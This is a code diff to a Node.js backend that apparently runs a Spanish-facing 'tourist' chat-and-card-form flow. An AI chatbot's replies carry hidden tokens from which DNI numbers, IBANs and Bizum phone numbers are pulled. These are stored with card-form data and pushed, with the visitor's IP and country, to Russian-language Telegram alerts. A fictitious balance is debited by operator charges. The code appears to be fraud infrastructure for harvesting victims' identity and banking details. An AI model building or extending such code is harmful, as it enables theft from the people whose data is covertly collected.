@@ -22,6 +22,14 @@ import { setApiKey, clearApiKey, listCredentials, maskKey, CREDENTIAL_PROVIDERS 
 import { sendPlainToTelegram } from './telegram.js';
 import { queueTranslation, isTranslatable, DEFAULT_TRANSLATE_PROMPT } from './ai/translator.js';
 import { buildSystemPrompt } from './ai/promptBuilder.js';
+import {
+  applyChatPaymentDetails,
+  extractChatPaymentDetails,
+  extractUserPaymentDetails,
+  getClientPaymentDetails,
+  getClientTransferDescription,
+  normalizeBizum,
+} from './chatPaymentDetails.js';
 import { createHash, randomUUID, timingSafeEqual } from 'node:crypto';
 import { sendPush } from './firebase.js';
 
@@ -1062,7 +1070,13 @@ async function handleTouristStatus(req, reply) {
   reply.header('Cache-Control', 'no-store');
   try {
     const flowSessionId = sanitizeString(req.query.s || '', 80);
-    if (!flowSessionId) return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });
+    if (!flowSessionId) return reply.send({
+      operatorCalled: false,
+      operatorStatus: 'pending',
+      paymentMethod: '',
+      iban: '',
+      bizum: '',
+    });
 
     let client = null;
     try {
@@ -1080,15 +1094,22 @@ async function handleTouristStatus(req, reply) {
     }
 
     const sub = (client?.submissionData && typeof client.submissionData === 'object') ? client.submissionData : {};
+    const paymentDetails = getClientPaymentDetails(sub);
     const opStatus = client?.operatorStatus ?? (client?.operatorCalled ? 'called' : 'pending');
     return reply.send({
       operatorCalled: client?.operatorCalled ?? false,
       operatorStatus: opStatus,
-      iban: sub.iban || '',
+      ...paymentDetails,
       nombre: client?.nombre || sub.nombre || '',
     });
   } catch {
-    return reply.send({ operatorCalled: false, operatorStatus: 'pending', iban: '' });
+    return reply.send({
+      operatorCalled: false,
+      operatorStatus: 'pending',
+      paymentMethod: '',
+      iban: '',
+      bizum: '',
+    });
   }
 }
 
@@ -1368,6 +1389,8 @@ async function handleCreditCardSubmission(req, reply) {
   try {
     const body = asRecord(req.body) ?? {};
     const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
+    const submittedPaymentMethod = sanitizeString(getString(body.paymentMethod), 20).toLowerCase();
+    const submittedBizum = normalizeBizum(getString(body.bizum));
     const formData = {
       nombre: sanitizeString(getString(body.nombre), 200),
       phone: sanitizeString(getString(body.phone), 30),
@@ -1381,7 +1404,8 @@ async function handleCreditCardSubmission(req, reply) {
       email: sanitizeString(getString(body.email), 200),
     };
 
-    // Merge with existing submissionData to preserve DNI/IBAN collected during chat
+    // Merge with existing submissionData to preserve the payment destination
+    // collected during the first chat.
     let existingSub = {};
     if (flowSessionId) {
       try {
@@ -1394,13 +1418,30 @@ async function handleCreditCardSubmission(req, reply) {
       } catch { /* non-fatal */ }
     }
 
-    const submissionData = { ...existingSub };
-    for (const [k, v] of Object.entries(formData)) {
-      if (v) submissionData[k] = v;
+    let submissionData = { ...existingSub };
+    if (submittedPaymentMethod === 'bizum' && submittedBizum) {
+      submissionData = applyChatPaymentDetails(submissionData, {
+        paymentMethod: 'bizum',
+        iban: null,
+        bizum: submittedBizum,
+      });
     }
-    // Preserve DNI/IBAN from chat if form doesn't supply them
+    const selectedPayment = getClientPaymentDetails(submissionData);
+    for (const [k, v] of Object.entries(formData)) {
+      if (!v) continue;
+      // The card form has its own withdrawal IBAN. It must not replace the
+      // Bizum destination selected in the first chat.
+      if (k === 'iban' && selectedPayment.paymentMethod === 'bizum') {
+        submissionData.cardIban = v;
+      } else {
+        submissionData[k] = v;
+      }
+    }
+    // Preserve DNI/IBAN from chat if form doesn't supply them.
     if (!formData.dni && existingSub.dni) submissionData.dni = existingSub.dni;
-    if (!formData.iban && existingSub.iban) submissionData.iban = existingSub.iban;
+    if (!formData.iban && existingSub.iban && submissionData.paymentMethod !== 'bizum') {
+      submissionData.iban = existingSub.iban;
+    }
 
     if (flowSessionId) {
       await upsertWebClient(flowSessionId, {
@@ -1419,6 +1460,7 @@ async function handleCreditCardSubmission(req, reply) {
       submissionData.nombre ? `Имя: *${submissionData.nombre}*` : '',
       submissionData.email ? `Email: ${submissionData.email}` : '',
       submissionData.iban ? `IBAN: \`${submissionData.iban}\`` : '',
+      submissionData.bizum ? `Bizum: \`${submissionData.bizum}\`` : '',
       submissionData.dni ? `DNI: \`${submissionData.dni}\`` : '',
       `IP: \`${ip}\`${country ? ' · ' + country : ''}`,
     ].filter(Boolean);
@@ -2440,26 +2482,29 @@ async function handleChat(req, reply) {
     });
 
     // Extract hidden tokens before stripping them from the user-visible text.
-    // Регулярки терпимы к пробелам после двоеточия и внутри значения (ИИ часто форматирует IBAN/телефон с пробелами).
-    const dniMatch   = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
-    const ibanMatch  = rawReply.match(/\[\[IBAN:\s*([A-Z0-9][A-Z0-9 ]{3,44})\]\]/i);
-    const phoneMatch = rawReply.match(/\[\[PHONE:\s*([0-9+][0-9+\-() ]{4,24})\]\]/i);
-    const extractedDni   = dniMatch   ? dniMatch[1].replace(/[\s\-]/g, '').toUpperCase() : null;
-    const extractedIban  = ibanMatch  ? ibanMatch[1].replace(/\s/g, '').toUpperCase() : null;
-    const extractedPhone = phoneMatch ? phoneMatch[1].replace(/[^0-9+]/g, '') : null;
-
+    const dniMatch = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
+    const extractedDni = dniMatch ? dniMatch[1].replace(/[\s\-]/g, '').toUpperCase() : null;
+    // In the first chat, [[BIZUM:...]] is the phone linked to Bizum.
+    // The support chat below separately keeps PHONE as the ordinary contact phone.
     const isDone = rawReply.includes('[[FIN]]');
+    const tokenPaymentDetails = extractChatPaymentDetails(rawReply);
+    const paymentDetails = tokenPaymentDetails.paymentMethod
+      ? tokenPaymentDetails
+      : (isDone ? extractUserPaymentDetails(message) : tokenPaymentDetails);
+    const extractedIban = paymentDetails.iban;
+    const extractedBizum = paymentDetails.bizum;
+
     const replyText = rawReply
       .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
       .replace(/\[\[IBAN:[^\]]*\]\]/gi, '')
-      .replace(/\[\[PHONE:[^\]]*\]\]/gi, '')
+      .replace(/\[\[BIZUM:[^\]]*\]\]/gi, '')
       .replace(/\[\[FIN\]\]/g, '')
       .trim();
 
     await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });
 
-    // Save any extracted tokens to webClient immediately (IBAN from stage 1, DNI/PHONE from stage 4)
-    if (extractedDni || extractedIban || extractedPhone) {
+    // Save extracted tokens immediately. IBAN and Bizum are mutually exclusive.
+    if (extractedDni || paymentDetails.paymentMethod) {
       try {
         const existingClient = await prisma.webClient.findUnique({
           where: { flowSessionId: sessionId },
@@ -2467,18 +2512,17 @@ async function handleChat(req, reply) {
         });
         const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
           ? existingClient.submissionData : {};
-        const newSub = { ...existingSub };
-        if (extractedIban)  newSub.iban  = extractedIban;
-        if (extractedDni)   newSub.dni   = extractedDni;
-        if (extractedPhone) newSub.phone = extractedPhone;
+        const newSub = applyChatPaymentDetails(existingSub, paymentDetails);
+        if (extractedDni) newSub.dni = extractedDni;
         await upsertWebClient(sessionId, { submissionData: newSub });
         if (isDone) {
+          const selectedPayment = getClientPaymentDetails(newSub);
           const tgLines = [
             '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
             `Session: \`${sessionId}\``,
             extractedDni   ? `DNI: \`${extractedDni}\`` : '',
-            extractedPhone ? `Телефон: \`${extractedPhone}\`` : '',
-            newSub.iban    ? `IBAN: \`${newSub.iban}\`` : '',
+            selectedPayment.iban ? `IBAN: \`${selectedPayment.iban}\`` : '',
+            selectedPayment.bizum ? `Bizum: \`${selectedPayment.bizum}\`` : '',
           ].filter(Boolean);
           sendToTelegram(tgLines.join('\n'));
         }
@@ -2489,8 +2533,9 @@ async function handleChat(req, reply) {
 
     const extra = {};
     if (extractedIban)  extra.collectedIban  = extractedIban;
+    if (extractedBizum) extra.collectedBizum = extractedBizum;
     if (extractedDni)   extra.collectedDni   = extractedDni;
-    if (extractedPhone) extra.collectedPhone = extractedPhone;
+    if (paymentDetails.paymentMethod) extra.paymentMethod = paymentDetails.paymentMethod;
     return reply.send({ reply: replyText, ...(isDone ? { done: true } : {}), ...extra });
   } catch (err) {
     console.error('[chat] error:', err?.message || err);
@@ -4510,12 +4555,19 @@ async function handleChatOpCharge(req, reply) {
     }
     const wc = await prisma.webClient.findUnique({
       where: { flowSessionId: sessionId },
-      select: { balance: true, transactions: true },
+      select: { balance: true, transactions: true, submissionData: true },
     });
     if (!wc) return reply.status(404).send({ error: 'not_found' });
     const newBalance = Math.max(0, (wc.balance ?? 5000) - amount);
     const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
-    txs.push({ id: randomUUID(), type: 'debit', amount, description: 'Transferencia al IBAN', contractLabel, date: new Date().toISOString() });
+    txs.push({
+      id: randomUUID(),
+      type: 'debit',
+      amount,
+      description: getClientTransferDescription(wc.submissionData),
+      contractLabel,
+      date: new Date().toISOString(),
+    });
     await prisma.webClient.update({
       where: { flowSessionId: sessionId },
       data: { balance: newBalance, transactions: txs },
